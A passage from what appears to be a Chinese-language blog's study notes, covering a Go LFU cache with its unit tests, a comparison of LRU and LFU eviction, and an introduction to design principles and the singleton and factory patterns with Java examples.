&#123;\t\treturn\t&#125;\tentry := back.Value.(*cacheEntry[K, V])\tminList.Remove(back)\tdelete(l.items, entry.key)\tdelete(l.entries, entry.key)&#125;// Len 返回缓存中元素的数量func (l *LFUCache[K, V]) Len() int &#123;\treturn len(l.items)&#125;\n\n测试package utilsimport (\t&quot;testing&quot;)func TestLFUCache_EmptyCache(t *testing.T) &#123;\tcache := NewLFUCache[string, int](2)\t// 测试空缓存\tif val, ok := cache.Get(&quot;nonexistent&quot;); ok || val != 0 &#123;\t\tt.Errorf(&quot;Get from empty cache should return zero value, got %v, %v&quot;, val, ok)\t&#125;\tif l := cache.Len(); l != 0 &#123;\t\tt.Errorf(&quot;Len of empty cache should be 0, got %d&quot;, l)\t&#125;&#125;func TestLFUCache_SingleItem(t *testing.T) &#123;\tcache := NewLFUCache[string, int](1)\t// 测试单个元素\tcache.Put(&quot;one&quot;, 1)\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\t// 测试替换\tcache.Put(&quot;two&quot;, 2)\tif val, ok := cache.Get(&quot;one&quot;); ok &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) should be evicted, got %d, %v&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;two&quot;); !ok || val != 2 &#123;\t\tt.Errorf(&quot;Get(&#x27;two&#x27;) = %d, %v, want 2, true&quot;, val, ok)\t&#125;&#125;func TestLFUCache_EvictionPolicy(t *testing.T) &#123;\tcache := NewLFUCache[string, int](2)\t// 初始填充\tcache.Put(&quot;one&quot;, 1)\tcache.Put(&quot;two&quot;, 2)\t// 访问one增加其频率\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\t// 添加新元素，two应该被淘汰(频率较低)\tcache.Put(&quot;three&quot;, 3)\tif val, ok := cache.Get(&quot;two&quot;); ok &#123;\t\tt.Errorf(&quot;Get(&#x27;two&#x27;) should be evicted, got %d, %v&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;three&quot;); !ok || val != 3 &#123;\t\tt.Errorf(&quot;Get(&#x27;three&#x27;) = %d, %v, want 3, true&quot;, val, ok)\t&#125;\t// 再访问three使其频率与one相同\tif val, ok := cache.Get(&quot;three&quot;); !ok || val != 3 &#123;\t\tt.Errorf(&quot;Get(&#x27;three&#x27;) = %d, %v, want 3, true&quot;, val, ok)\t&#125;\t// 添加新元素，one应该被淘汰(相同频率但更久未使用)\tcache.Put(&quot;four&quot;, 4)\tif val, ok := cache.Get(&quot;one&quot;); ok &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) should be evicted, got %d, %v&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;three&quot;); !ok || val != 3 &#123;\t\tt.Errorf(&quot;Get(&#x27;three&#x27;) = %d, %v, want 3, true&quot;, val, ok)\t&#125;\tif val, ok := cache.Get(&quot;four&quot;); !ok || val != 4 &#123;\t\tt.Errorf(&quot;Get(&#x27;four&#x27;) = %d, %v, want 4, true&quot;, val, ok)\t&#125;&#125;func TestLFUCache_UpdateExisting(t *testing.T) &#123;\tcache := NewLFUCache[string, int](2)\tcache.Put(&quot;one&quot;, 1)\tcache.Put(&quot;one&quot;, 11) // 更新\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 11 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 11, true&quot;, val, ok)\t&#125;\tif l := cache.Len(); l != 1 &#123;\t\tt.Errorf(&quot;Len should be 1 after update, got %d&quot;, l)\t&#125;&#125;func TestLFUCache_ZeroCapacity(t *testing.T) &#123;\tcache := NewLFUCache[string, int](0)\tcache.Put(&quot;one&quot;, 1)\tif val, ok := cache.Get(&quot;one&quot;); ok &#123;\t\tt.Errorf(&quot;Get from zero-capacity cache should return nothing, got %d, %v&quot;, val, ok)\t&#125;&#125;func TestLFUCache_MinFrequencyUpdate(t *testing.T) &#123;\tcache := NewLFUCache[string, int](2)\t// 初始填充\tcache.Put(&quot;one&quot;, 1)\tcache.Put(&quot;two&quot;, 2)\t// 访问one增加其频率\tif val, ok := cache.Get(&quot;one&quot;); !ok || val != 1 &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) = %d, %v, want 1, true&quot;, val, ok)\t&#125;\t// 添加新元素，two应该被淘汰(频率较低)\tcache.Put(&quot;three&quot;, 3)\t// 现在minFreq应该是1(three的频率)\tif val, ok := cache.Get(&quot;three&quot;); !ok || val != 3 &#123;\t\tt.Errorf(&quot;Get(&#x27;three&#x27;) = %d, %v, want 3, true&quot;, val, ok)\t&#125;\t// 再次访问three使其频率增加到2\tif val, ok := cache.Get(&quot;three&quot;); !ok || val != 3 &#123;\t\tt.Errorf(&quot;Get(&#x27;three&#x27;) = %d, %v, want 3, true&quot;, val, ok)\t&#125;\t// 添加新元素，应该淘汰one(因为three频率更高)\tcache.Put(&quot;four&quot;, 4)\tif val, ok := cache.Get(&quot;one&quot;); ok &#123;\t\tt.Errorf(&quot;Get(&#x27;one&#x27;) should be evicted, got %d, %v&quot;, val, ok)\t&#125;&#125;func TestLFUCache_CustomTypes(t *testing.T) &#123;\ttype customKey struct &#123;\t\tid   int\t\tname string\t&#125;\tcache := NewLFUCache[customKey, string](2)\tkey1 := customKey&#123;1, &quot;apple&quot;&#125;\tkey2 := customKey&#123;2, &quot;banana&quot;&#125;\tcache.Put(key1, &quot;red&quot;)\tcache.Put(key2, &quot;yellow&quot;)\t// 访问key1增加其频率\tif val, ok := cache.Get(key1); !ok || val != &quot;red&quot; &#123;\t\tt.Errorf(&quot;Get(key1) = %s, %v, want &#x27;red&#x27;, true&quot;, val, ok)\t&#125;\t// 添加新元素，key2应该被淘汰(频率较低)\tcache.Put(customKey&#123;3, &quot;cherry&quot;&#125;, &quot;pink&quot;)\tif val, ok := cache.Get(key2); ok &#123;\t\tt.Errorf(&quot;Get(key2) should be evicted, got %s, %v&quot;, val, ok)\t&#125;&#125;func TestLFUCache_ConcurrentAccess(t *testing.T) &#123;\tcache := NewLFUCache[string, int](100)\tdone := make(chan bool)\t// 并发写入\tgo func() &#123;\t\tfor i := 0; i &lt; 10000; i++ &#123;\t\t\tcache.Put(&quot;key&quot;, i)\t\t&#125;\t\tdone &lt;- true\t&#125;()\t// 并发读取\tgo func() &#123;\t\tfor i := 0; i &lt; 10000; i++ &#123;\t\t\tcache.Get(&quot;key&quot;)\t\t&#125;\t\tdone &lt;- true\t&#125;()\t&lt;-done\t&lt;-done\t// 最终检查\tif val, ok := cache.Get(&quot;key&quot;); !ok &#123;\t\tt.Errorf(&quot;Key should exist after concurrent access&quot;)\t&#125; else if val &lt; 0 || val &gt;= 10000 &#123;\t\tt.Errorf(&quot;Unexpected value after concurrent access: %d&quot;, val)\t&#125;&#125;\n\nLRU 和 LFU 的比较\n\n\n特性\nLRU\nLFU\n\n\n\n淘汰策略\n淘汰最久未使用的\n淘汰使用频率最低的\n\n\n实现复杂度\n相对简单\n相对复杂\n\n\n适用场景\n访问模式随时间变化不大\n访问频率差异明显的场景\n\n\n对突发流量\n可能淘汰热点数据\n对新数据不友好\n\n\n内存消耗\n较低\n较高\n\n\n\nLRU 实现简单，适合大多数通用场景，对突发流量友好。\nLFU 适合访问模式相对稳定的场景，能更好地保留高频访问数据。\n\n另外，还有 LRU 和 LFU 的变体和混合算法以及FIFO（First in First out），先进先出，最先进入的数据，最先被淘汰等算法，以不同的淘汰策略适应不同的应用场景。\n","categories":["学习笔记"],"tags":["go","算法","缓存","LRU","LFU"]},{"title":"设计模式","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","content":"设计模式概述产生背景“设计模式”最初并不是出现在软件设计中，而是被用于建筑领域的设计中。1977年美国著名建筑大师、加利福尼亚大学伯克利分校环境结构中心主任克里斯守托夫·亚历山大(Christopher Alexander)在他的作《建筑模式语言：城镇、建筑、构造》中描述了一些常见的建筑设计问题，并提出了253种关于对城镇、邻里、住宅、花园和房间等进行设计的基本模式。1990年软件工程界开始研讨设计模式的话题，后来召开了多次关于设计模式的研讨会。直到1995年，艾瑞克伽马(ErichGamma)、理查德-海尔姆(Richard Helm)、拉尔夫·约翰森(Ralph Johnson)、约翰威利斯迪斯(John Vlissides)等4位作者合作出版了《设计模式：可复用面向对象软件的基础》一书，在此书中收录了23个设计模式，这是设计模式领域里程碑的事件，导致了软件设计模式的突破。这4位作者在软件开发领域里也以他们的”四人组”(Gang of Four,GoF)著称。\n软件设计模式概念软件设计模式(Software Design Pattern),又称设计模式，是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。它描述了在软件设计过程中的一些不断重复发生的问题，以及该问题的解决方案。也就是说，它是解决特定问题的一系列套路，是前辈们的代码设计经验的总结，具有一定的普遍性，可以反复使用。\n使用设计模式的必要性设计模式的本质是面向对设计原则的实际运用，是对类的封装性、继承性和多态性以及类的关联关系和组合关系的充分理解。正确使用设计模式具有以下优点：\n\n使程序设计更加标准化、代码编制更加工程化，使软件开发效率大大提高，从而缩短软件的开发周期。\n使设计的代码可重用性高、可读性强、可靠性高、灵活性好、可维护性强。\n\n设计模式分类\n创建型模式用于描述“怎样创建对象”，它的主要特点是“将对象的创建与使用分离”。（四人组）书中提供了单例、原型、工厂方法、抽象工厂、建造者等5种创健型模式。\n结构型模式用于描述如何将类或对像按某种布局组成更大的结构，（四人组）书中提供了代理、适配器、桥接、装饰、外观、享元、组合等7种结构型模式。\n行为型模式用于描述类或对象之间怎样相互协作共同完成单个对象无法单独完成的任务，以及怎样分配职责。(四人组)书中提供了模板方法、策略、命令、职责链、状态、观察者、中介者、迭代器、访问者、备忘录、解释器等11种行为型模式\n\nUML统一建模语言(Unified Modeling Language,UML)是用来设计软件的可视化建模语言。它的特点是简单、统一、图形化、能表达软件设计中的动态与静态信息。UML从目标系统的不同角度出发，定义了用例图、类图、对象图、状态图、活动图、时序图、协作图、构件图、部署图等9种图。\n类图概述类图(Class diagram)是显示了模型的静态结构，特别是模型中存在的类、类的内部结构以及它们与其他类的关系等。类图不显示暂时性的信息。类图是面向对象建模的主要组成部分。\n类图的作用\n在软件工程中，类图是一种静态的结构图，描述了系统的类的集合，类的属性和类之间的关系，可以简化了人们对系统的理解：\n类图是系统分析和设计阶段的重要产物，是系统编码和测试的重要模型。\n\n类图表示法类的表示方式UML类图中，类使用包含类名、属性(field)和方法(method)且带有分割线的矩形来表示属性&#x2F;方法名前加的加号和减号表示了这个属性&#x2F;方法的可见性，UML图中表示可见性的符号有三种：\n\n+:表示 pub1ic\n-:表示 private\n#:表示 protected\n\n属性的完整表示方式是：可见性 名称：类型[ &#x3D; 缺省值]方法的完整表示方式是：可见性 名称（参数列表）[ ： 返回类型]\n\n\n中括号中的内容表示是可选的也有将类型放在变量名前面，返回值类型放在方法名前面\n\n比如：\n类和类之间的表示方式关联关系关联关系是对象之间的一种引用关系，用于表示一类对象与另一类对象之间的联系，如老师和学生、师傅和徒弟、丈夫和妻子等。关联关系是类与类之间最常用的一种关系，分为一般关联关系、聚合关系和组合关系。我们先介绍一般关联。关联又可以分为单向关联，双向关联，自关联。\n\n单向关联在UML类图中单向关联用一个带箭头的实线表示。\n双向关联在UML类图中，双向关联用一个不带箭头的直线表示。\n自关联自关联在UML类图中用一个带有箭头且指向自身的线表示。\n\n聚合关系聚合关系是关联关系的一种，是强关联关系，是整体和部分之间的关系。聚关系也是通过成员对象来实现的，其中成员对象是整体对象的一部分，但是成员对象可以脱离整体对象而独立存在。例如，学校与老师的关系，学校包含老师，但如果学校停办了，老师依然存在。在UML类图中，聚合关系可以用带空心菱形的实线来表示，菱形指向整体。\n\n组合关系组合表示类之间的整体与部分的关系，但它是一种更强烈的聚合关系。在组合关系中，整体对象可以控制部分对象的生命周期，一旦整体对象不存在，部分对象也将不存在，部分对象不能脱离整体对象而存在。例如，头和嘴的关系，没有了头，嘴也就不存在了。在UML类图中，组合关系用带实心菱形的实线来表示，菱形指向整体。\n\n依赖关系依赖关系是一种使用关系，它是对象之间耦合度最弱的一种关联方式，是临时性的关联。在代码中，某个类的方法通过局部变量、方法的参数或者对静态方法的调用来访问另一个类（被依赖类）中的某些方法来完成一些职责。在UML类图中，依赖关系使用带箭头的虚线来表示，箭头从使用类指向被依赖的类。\n\n继承关系继承关系是对象之间耦合度最大的一种关系，表示一股与特殊的关系，是父类与子类之间的关系，是一种继承关系。在UML类图中，泛化关系用带空心三角箭头的实线来表示，箭头从子类指向父类。在代码实现时，使用面向对象的继承机制来实现泛化关系。例如，Student类和Teacher类都是Person类的子类\n\n实现关系实现关系是接口与实现类之间的关系。在这种关系中，类实现了接口，类中的操作实现了接口中所声明的所有的抽象操作。在UML类图中，实现关系使用带空心三角箭头的虚线来表示，箭头从实现类指向接口。例如，汽车和船实现了交通工具\n\n软件设计原则在软件开发中，为了提高软件系统的可维护性和可复用性，增加软件的可扩展性和灵活性。程序员要尽量根据6条原则来开发程序，从而提高软件开发效率、节约软件开发成本和维护成本。\n开闭原则（OCP）对扩展开放，对修改关闭。存程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩护展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类。因为抽象灵活性好，适应性广，只要抽象的合理，可以基本保持软件架构的稳定。而软件中易变的细节可以从抽象派生来的实现类来进行扩展，当软件需要发生变化时，只需要根据需求重新派生一个实现类来扩展就可以了。\n例如：搜狗输入法 的皮肤是输入法背景图片、窗口颜色和声音等元素的组合。用户可以根据自己的喜爱更换自己的输入法的皮肤，也可以从网上下载新的皮肤。这些皮肤有共同的特点，可以为其定义一个抽象类（AbstractSkin），而每个具体的皮肤（DefaultSpecificSkin和HeimaSpecificSkin）是其子类。用户窗体可以根据需要选择或者增加新的主题，而不需要修改原代码，所以它是满足开闭原则的。\n里氏替换原则（LSP）里氏代换原则是面向对象设计的基本原则之一。里氏代换原则：任何基类可以出现的地方，子类一定可以出现。 通俗理解：子类可以扩展父类的功能，但不能改变父类原有的功能换句话说，子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法。如果通过重写父类的方法来完成新的功能，这样写起来虽然简单，但是整个继承体系的可复用性会比较差，特别是运用多态比较频案时，程序运行出错的概率会非常大，\n详细可以参考：细说 里氏替换原则里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化。而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。\n例如：在数学领域里，正方形毫无疑问是长方形，它是一个长宽相等的长方形。所以，我们开发的一个与几何图形相关的软件系统，就可以顺理成章的让正方形继承自长方形。但当需要增加长方形的宽度直至大于长度时（一些新的需要），正方形的代码便会出现问题。即正方形与长方形的继承关系违反了里氏替换原则，他们之间的继承关系不成立，正方形不是长方形。改进：正方形和长方形都继承四边形的接口\n依赖倒转原则（DIP）高层模块不应该依赖低层模块，两者都应该依赖其抽象：抽象不应该依赖细节，细节应该依赖抽象。简单的说就是要求对抽象进行编程，不要对实现进行编程，这样就降低了客户与实现模块间的耦合。\n例如：组装电脑现要组装一台电脑，需要配件，硬盘，内存条等。只有这些配置都有了，计算机才能正常的运行。选择cpu有很多选择，如Intel，AMD等，硬盘可以选择希捷，西数等，内存条可以选择金士顿，海盗船等。这时，应该将配件抽象化（接口或抽象类）。否则当配件修改时，电脑部分也需要修改（不符合开闭原则）。\n像下图这样设计会导致配件无法更换。改进：将需要的配件进行抽象。让电脑类依赖于各个配件的抽象，而不是直接依赖于各个配件的实现。\n接口隔离原则（ISP）客户不应该被迫依赖于它不使用的方法：一个类对另一个类的依赖应该建立在最小的接口上。ISP将大接口拆分为更小更具体的接口，以便客户取他们需要的。\n例如：安全门案例我们需要创建一个独立品牌的安全门，该安全门具有防火、防水、防盗的功能。可以将防火，防水，防盗功能提取成一个接口，形成一套规范。但当我们需要创建另一个安全门，只具有防火和防水功能时。就无法实现了。改进的方法就是：将防盗、防火、防水提取成的一个接口拆分成三个接口，以便客户只取需要的。\n迪米特法则（LOD）迪米特法则（Law of Demeter）又叫作最少知识原则（The Least Knowledge Principle）一个类对于其他类知道的越少越好，就是说一个对象应当对其他对象有尽可能少的了解。只和朋友通信，不和陌生人说话。（talk only to your immediate friends）其含义是：如果两个软件实体无须直接通信，那么就不应当发生直接的相互调用，可以通过第三方转发该调用。其目的是降低类之间的耦合度，提高模块的相对独立性。迪米特法则中的“朋友“是指：当前对象本身、当前对象的成员对象、当前对象所创建的对象、当前对象的方法参数等，这些对象同当前对象存在关联、聚合或组合关系，可以直接访问这些对象的方法。\n例如：明星与经纪人的关系实例明星由于全身心投入艺术，所以许多日常事务由经纪人负责处理，如和粉丝的见面会，和媒体公司的业务洽谈等。这里的经纪人是明星的朋友，而粉丝和媒体公司是陌生人，所以适合使用迪米特法则。\n合成复用原则（CRP）合成复用原则是指：尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现。通常类的复用分为继承复用和合成复用两种。\n继承复用虽然有简单和易实现的优点，但它也存在以下缺点：\n\n继承复用破坏了类的封装性，因为继承会将父类的实现细节暴幕给子类，父类对子类是透明的，所以这种复用又称为“白箱“复用。\n子类与父类的耦合度高。父类的实现的任何改变都会导致子类的实现发生变化，这不利于类的扩展与维护。\n它限制了复用的灵活性。从父类继承而来的实现是静态的，在编译时已经定义，所以在运行时不可能发生变化。\n\n采用组合或聚合复用时，可以将已有对象纳入新对象中，使之成为新对象的一部分，新对象可以调用已有对象的功能，它有以下优点：\n\n它维持了类的封装性。因为成分对象的内部细节是新对象看不见的，所以这种复用又称为“黑箱“复用。\n对象间的桐合度低。可以在类的成员位置声明抽象。\n复用的灵活性高。这种复用可以在运行时动态进行，新对象可以动态地引用与成分对象类型相同的对象。\n\n例如：汽车分类管理程序汽车按“动力源“划分可分为汽油汽车、电动汽车等；按“颜色“划分可分为白色汽车、黑色汽车和红色汽车等。如果同时考虑这两种分类，其组合就很多。所以可以将颜色以接口的方式实现，汽车类实现颜色接口，在创建汽车时传入颜色对象。可以减少很多子类的产生。\n创建者模式创建型模式的主要关注点是“怎样创建对像？”，它的主要特点是“将对象的创建与使用分离”。这样可以降低系统的糯合度，使用者不需要关注对象的创建细节。创建型模式分为：\n\n单例模式\n工厂方法模式\n抽象工程模式\n原型模式\n建造者模式\n\n单例设计模式单例模式(Singleton Pattern)是Java中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。\n单例模式的结构单例模式的主要有以下角色：\n\n单例类。只能创建一个实例的类\n访问类。使用单例类\n\n单例模式的实现\n单例设计模式分类两种：\n\n饿汉式：类加载就会导致该单实例对象被创建\n懒汉式：类加载不会导致该单实例对象被创建，而是首次使用该对象时才会创建\n\n\n\n饿汉式（静态变量） public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 本类中创建本类对象    private static Singleton instance = new Singleton();    // 提供一个公共的访问方式，让外界获取对象    public static Singleton getInstance()&#123;        return instance;    &#125;&#125;\n\n该方式中 instance 对象随类加载而创建，如果对象足够大，而且一直没有使用就会造成内存的浪费。\n\n\n饿汉式（静态代码块） public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 声明Singleton类型的变量    private static Singleton instance;    // 静态代码块中赋值    static &#123;        instance = new Singleton();    &#125;    // 对外提供获取该对象的方法    public static Singleton getInstance()&#123;        return instance;    &#125;&#125;\n\n该方式与上面一样，也是随类加载而创建，也会造成内存的浪费。\n\n\n懒汉式（线程安全，在方法上加 synchronized 关键字）public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 声明    private static Singleton instance;    // 对外提供访问方式    public static synchronized Singleton getInstance()&#123;        if (instance==null)&#123;            instance = new Singleton();        &#125;        return instance;    &#125;&#125;\n懒汉式（双重检查锁）\n上一种方式虽然是线程安全的，但没必要让每个线程必须持有锁才能调用该方法。因为绝大部分操作都是读操作，读操作是线程安全的。所以需要调整加锁的时机。\n\n/** * 懒汉式 */public class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 声明    private static Singleton instance;    // 对外提供访问方式    public static Singleton getInstance()&#123;        // 第一次判断        if (instance==null)&#123;            synchronized (Singleton.class)&#123;                // 第二次判断                if (instance == null) &#123;                    instance = new Singleton();                &#125;            &#125;        &#125;        return instance;    &#125;&#125;\n\n双重检查锁是很好的单例实现模式，解决了单例、性能、线程安全的问题。但上一种实现方式在多线程的情况下，可能会出现空指针的问题，因为JVM在实例化对象时会进行优化和指令重排序的操作。需要使用 volatile 关键字，volatile 可以保证可见性和有序性。在上面的代码中，给变量 instance 添加 volatile 关键字即可。是比较好的实现方式\n\n\n懒汉式（静态内部类）\n静态内部类单例模式中实例由内部类创建。因为JVM在加载外部类的过程中，不会加载静态内部类，只有内部类的属性&#x2F;方法被调用时才会被加载并初始化。静态属性由于被 static 修饰，保证只被实例化一次，并且严格保证实例化顺序。\n\npublic class Singleton &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 定义一个静态内部类    private static class SingletonHolder&#123;        // 申明并初始化变量        private static final Singleton INSTANCE = new Singleton();    &#125;    // 对外提供访问方式    public static Singleton getInstance()&#123;        return SingletonHolder.INSTANCE;    &#125;&#125;\n\n是一种优秀的实现方式，比较常用在没有加任何锁的情况下，保证了线程安全，并且没有任何性能和空间的浪费。\n\n\n枚举方式\n枚举是线程安全的，并且只会装载一次。枚举类型是所有单例实现中唯一一种不会被破环的实现模式。属于饿汉式方式 \n\npublic enum Singleton &#123;    INSTANCE&#125;\n\n存在的问题破坏单例模式：使单例类可以创建多个对象，枚举方式除外。有两种方式：序列化和反射。\n序列化方式：\nimport java.io.*;public class Client &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        writeObjectFile();        Singleton instance = readObjectFile();        Singleton instance1 = readObjectFile();        System.out.println(instance==instance1);    &#125;    // 从文件读取数据    public static Singleton readObjectFile() throws IOException, ClassNotFoundException &#123;        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./a.txt&quot;));        Singleton instance = (Singleton) inputStream.readObject();        inputStream.close();        return instance;    &#125;    // 向文件中写数据    public static void writeObjectFile() throws IOException &#123;        Singleton instance = Singleton.getInstance();        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./a.txt&quot;));        outputStream.writeObject(instance);        outputStream.close();    &#125;&#125;\n\n反射模式：\nimport java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;public class Client &#123;    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        // 获取字节码对象        Class&lt;Singleton&gt; c = Singleton.class;        // 获取无参构造方法        Constructor&lt;Singleton&gt; constructor = c.getDeclaredConstructor();        // 取消访问检查        constructor.setAccessible(true);        // 创建对象        Singleton instance = constructor.newInstance();        Singleton instance1 = constructor.newInstance();        System.out.println(instance == instance1);    &#125;&#125;\n\n解决方法：\n反序列化破坏的解决方式：在单例类中添加 readResolve() 方法，在反序列化时被反序列化方法调用。如果定义了这个方法，就返回这个方法的返回值，如果没有定义，则返回new出来的对象。\npublic class Singleton implements Serializable &#123;    // 私有构造方法    private Singleton()&#123;&#125;    // 本类中创建本类对象    private static Singleton instance = new Singleton();    // 提供一个公共的访问方式，让外界获取对象    public static Singleton getInstance()&#123;        return instance;    &#125;    // 当进行反序列化时，会自动调用该方法，将该方法返回值直接返回    public Object readResolve()&#123;        return instance;    &#125;&#125;\n\n反射破坏的解决方式：在单例类的无参构造方法中，判断是否是第一次创建。\npublic class Singleton implements Serializable &#123;    // 判断是否是第一次访问构造方法    private static boolean flag = false;    // 私有构造方法    private Singleton() &#123;        synchronized (Singleton.class) &#123;            if (flag) &#123;                throw new RuntimeException(&quot;不能创建多个对象&quot;);            &#125;            flag = true;        &#125;    &#125;    // 定义一个静态内部类    private static class SingletonHolder &#123;        // 申明并初始化变量        private static final Singleton INSTANCE = new Singleton();    &#125;    // 对外提供访问方式    public static Singleton getInstance() &#123;        return Singleton.SingletonHolder.INSTANCE;    &#125;&#125;\n\n关于懒汉式与饿汉式的区别：饿汉式：在类加载时就已经创建好单例对象，以供使用。懒汉式：只有在调用 getInstance 方法时才会创建对象。详细参考：单例模式中的懒汉模式和饿汉模式是什么？区别又是什么？\nRuntime 类中单例模式的应用Runtime 类：Runtime类封装了运行时的环境。每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。一般不能实例化一个Runtime对象，应用程序也不能创建自己的 Runtime 类实例，但可以通过 getRuntime 方法获取当前Runtime运行时对象的引用。一旦得到了一个当前的Runtime对象的引用，就可以调用Runtime对象的方法去控制Java虚拟机的状态和行为。Runtime 类是饿汉模式\nRuntime 部分源码（关于单例模式的部分）：\npublic class Runtime &#123;    private static final Runtime currentRuntime = new Runtime();    private static Version version;    /**     * Returns the runtime object associated with the current Java application.     * Most of the methods of class &#123;@code Runtime&#125; are instance     * methods and must be invoked with respect to the current runtime object.     *     * @return  the &#123;@code Runtime&#125; object associated with the current     *          Java application.     */    public static Runtime getRuntime() &#123;        return currentRuntime;    &#125;    /** Don&#x27;t let anyone else instantiate this class */    private Runtime() &#123;&#125;&#125;\n\n使用 demo。（运行 ipconfig 命令）\nimport java.io.IOException;import java.io.InputStream;public class RuntimeDemo &#123;    public static void main(String[] args) throws IOException &#123;        // 获取runtime对象        Runtime runtime = Runtime.getRuntime();        // 调用runtime的方法exec，参数为一个命令        Process process = runtime.exec(&quot;ipconfig&quot;);        // 调用process对象的获取输入流的方法        InputStream is = process.getInputStream();        byte[] arr = new byte[1024*1024*100];        // 读取数据        int len = is.read(arr);// 返回读到的字节数        // 将字节数组转换为字符串输出到控制台        System.out.println(new String(arr,0,len,&quot;GBK&quot;));    &#125;&#125;\n\n工厂模式需求：设计一个咖啡店点餐系统。设计一个咖啡类（Coffee），并定义其两个子类（美式咖啡【AmericanCoffee】和拿铁咖啡【LatteCoffee】）；再设计一个咖啡店类（CoffeeStore），咖啡店具有点咖啡的功能。\n在java中，万物皆对象，这些对象都需要创建，如果创建的时候直接new该对象，就会对该对象耦合严重，假如我们要更换对象，所有new对象的地方都需要修改一遍，这显然违背了软件设计的开闭原则。如果我们使用工厂来生产对象，我们就只和工厂打交道就可以了，彻底和对象解耦，如果要更换对象，直接在工厂里更换该对象即可，达到了与对象解耦的目的。所以说，工厂模式最大的优点就是：解耦。\n简单工厂模式简单工厂不是一种设计模式，而是更像一种编程习惯。\n结构简单工厂包含如下角色：\n\n抽象产品：定义了产品的规范，描述了产品的主要特性和功能。\n具体产品：实现或者继承抽象产品的子类\n具体工厂：提供了创建产品的方法，调用者通过该方法来创建产品。\n\n实现对咖啡店点餐系统的改进：\n\n工厂（factory）处理创建对象的细节，一旦有了SimpleCoffeeFactory，CoffeeStore类中的orderCoffee()就变成此对象的客户，后期如果需要Coffee对象直接从工厂中获取即可。这样也就解除了和Coffee实现类的耦合，同时又产生了新的耦合，CoffeeStore对象和SimpleCoffeeFactory工厂对象的耦合，工厂对象和商品对象的耦合。后期如果再加新品种的咖啡，我们势必要需求修改SimpleCoffeeFactory的代码，违反了开闭原则。工厂类的客户端可能有很多，比如创建美团外卖等，这样只需要修改工厂类的代码，省去其他的修改操作。\n\npublic class SimpleCoffeeFactory &#123;    public Coffee createCoffee(String type) &#123;        Coffee coffee = null;        if(&quot;americano&quot;.equals(type)) &#123;            coffee = new AmericanoCoffee();        &#125; else if(&quot;latte&quot;.equals(type)) &#123;            coffee = new LatteCoffee();        &#125;        return coffee;    &#125;&#125;\n\n优缺点优点：封装了创建对象的过程，可以通过参数获取对象。将对象的创建和业务逻辑分开，避免修改客户代码。如果需要实现新的产品，直接修改工厂类，省去其他修改操作。缺点：增加新产品，需要修改工厂类的代码，违反开闭原则。\n扩展：静态工厂即将工厂类中的创建对象的功能定义为静态的。\n工厂方法模式工厂方法模式可以完美解决简单工厂的缺点，完全遵循开闭原侧。\n概念定义一个用于创建对象的接口，让子类决定实例化哪个产品类对象。工厂方法使一个产品类的实例化延迟到其工厂的子类。\n结构工厂方法模式的主要角色：\n\n抽象工厂(Abstract Factory):提供了创建产品的接口，调用者通过它访问具体工厂的工厂方法来创建产品。\n具体工厂(ConcreteFactory):主要是实现抽象工厂中的抽象方法，完成具体产品的创建。\n抽象产品(Product):定义了产品的规范，描述了产品的主要特性和功能。\n具体产品(ConcreteProduct):实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间一一对应。\n\n实现对咖啡店点餐系统的改进：\n\n要增加产品类时也要相应地增加工厂类，不需要修改工厂类的代码了，这样就解决了简单工厂模式的缺点。工厂方法模式就是简单工厂模式的进一步抽象（将工厂进行抽象）。由于使用了多态，工厂方法模式保持了简单工厂模式的优点，克服了他的缺点。\n\n抽象工厂：\npublic interface CoffeeFactory &#123;    Coffee createCoffee();&#125;\n\n具体工厂：\npublic class LatteCoffeeFactory implements CoffeeFactory &#123;    public Coffee createCoffee() &#123;        return new LatteCoffee();    &#125;&#125;public class AmericanCoffeeFactory implements CoffeeFactory &#123;    public Coffee 